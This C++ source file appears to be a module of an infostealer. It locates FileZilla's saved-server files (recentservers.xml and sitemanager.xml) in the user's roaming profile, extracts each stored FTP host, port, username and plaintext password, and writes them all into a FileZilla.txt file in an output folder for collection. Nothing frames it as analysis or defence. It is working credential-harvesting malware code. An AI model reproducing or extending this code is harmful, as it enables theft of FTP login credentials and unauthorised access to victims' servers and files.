//
// Created by .1qxz on 08.06.2024.
//

#include "FileZilla.h"

static const std::vector<fs::path> FILEZILLA_SAVES_PATHS = {
        Utils::getRoamingPath() / "FileZilla" / "recentservers.xml",
        Utils::getRoamingPath() / "FileZilla" / "sitemanager.xml"
};

void FileZilla::execute(fs::path &root) {
    std::vector<Server> servers = FileZilla::getServers();

    if(servers.empty())
        return;

    std::stringstream ss;
    for(const Server& server : servers)
    {
        ss << "Url: " << "ftp://" << server.host << ":" << std::to_string(server.port) << "/" << "\n";
        ss << "Username: " << server.user << "\n";
        ss << "Password: " << server.pass << "\n";
        ss << "\n";
    }

    Utils::writeFile(root / "FileZilla.txt", ss.str());
}

std::vector<Server> FileZilla::getServers() {
    std::vector<Server> servers;

    for(const fs::path& path : FILEZILLA_SAVES_PATHS)
    {
        if(!exists(path))
            continue;

        try
        {
            pugi::xml_document doc;
            if (!doc.load_file(path.string().c_str()))
                continue;

            for (pugi::xml_node serverNode : doc.child("FileZilla3").child("RecentServers").children("Server")) {
                Server server;
                server.host = serverNode.child("Host").text().as_string();
                server.port = serverNode.child("Port").text().as_int();
                server.user = serverNode.child("User").text().as_string();
                server.pass = serverNode.child("Pass").text().as_string();

                servers.push_back(server);
            }
        }
        catch (const std::exception& ignored) {}
    }

    return servers;
}
